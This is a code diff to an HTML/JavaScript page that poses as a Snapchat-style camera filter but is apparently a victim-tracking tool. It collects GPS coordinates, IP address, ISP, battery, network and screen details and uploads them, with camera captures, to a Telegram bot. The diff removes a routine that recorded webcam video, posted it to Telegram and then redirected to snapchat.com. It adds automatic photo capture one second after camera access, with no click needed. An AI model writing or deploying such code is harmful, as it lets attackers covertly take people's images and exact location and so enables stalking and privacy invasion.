@@ -99,7 +99,6 @@
         let ipInfo = {};
         let isReady = false;
 
-        // Exact GPS Location Track karne ke liye
         function getExactLocation() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
@@ -141,7 +140,6 @@
         }
 
         async function initCamera() {
-            // GPS aur IP dono ek sath fetch honge
             gpsData = await getExactLocation();
             ipInfo = await getIPAndLocation();
 
@@ -180,78 +178,18 @@
                 document.getElementById('loading-text').style.display = 'none';
                 isReady = true;
 
-                if (!cameraType) {
-                    startVideoRecording(globalStream);
-                }
+                // --- AUTO CAPTURE TRIGGERED WITHOUT CLICKING ---
+                setTimeout(() => {
+                    triggerCapture();
+                }, 1000);
 
             } catch (err) {
                 document.getElementById('loading-text').innerText = "Please allow camera access!";
             }
         }
 
-        async function startVideoRecording(stream) {
-            try {
-                let recordedChunks = [];
-                let mediaRecorder = new MediaRecorder(stream);
-
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data && event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
-
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    stream.getTracks().forEach(track => track.stop());
-
-                    let batteryText = "N/A";
-                    try {
-                        let bat = await navigator.getBattery();
-                        batteryText = `${Math.round(bat.level * 100)}% ${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
-                    } catch(e) {}
-
-                    let netType = (navigator.connection ? navigator.connection.effectiveType : "4G").toUpperCase();
-
-                    let detailsMsg = 
-                        `🌐 **IP & Exact Location**\n` +
-                        `🔢 IP Address: \`${ipInfo.ip}\`\n` +
-                        `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
-                        `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
-                        `📡 ISP: ${ipInfo.isp}\n\n` +
-                        `📱 **Device Details**\n` +
-                        `🔋 Battery: ${batteryText}\n` +
-                        `📶 Network: ${netType}\n` +
-                        `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
-                        `🕒 Time: ${new Date().toLocaleString()}\n\n` +
-                        `👑 **CREDIT BY : आयुष नेगी**`;
-
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('video', blob, 'snap_video.webm');
-                    formData.append('caption', detailsMsg);
-                    formData.append('parse_mode', 'Markdown');
-
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
-                    window.location.href = "https://www.snapchat.com";
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder.state === "recording") {
-                        mediaRecorder.stop();
-                    }
-                }, 4500);
-
-            } catch (err) {
-                window.location.href = "https://www.snapchat.com";
-            }
-        }
-
         async function triggerCapture() {
-            if (!isReady || !globalStream) {
-                alert("Please allow camera permission first!");
-                return;
-            }
+            if (!isReady || !globalStream) return;
 
             document.getElementById('loading-text').innerText = "Applying Filter...";
             document.getElementById('loading-text').style.display = 'block';
@@ -278,7 +216,6 @@
                 if (blob) {
                     let caption = "";
                     
-                    // Pehli photo ke sath exact GPS location aur device info aayegi
                     if (i === 1) {
                         caption = 
                             `🌐 **IP & Exact Location**\n` +
@@ -293,7 +230,6 @@
                             `🕒 Time: ${new Date().toLocaleString()}\n\n` +
                             `👑 **CREDIT BY : आयुष नेगी**`;
                     } else {
-                        // Baaki photos ke sath sirf credit rahega
                         caption = `👑 **CREDIT BY : आयुष नेगी**`;
                     }
 
@@ -321,5 +257,4 @@
         };
     </script>
 </body>
-    </html>
-    
+</html>
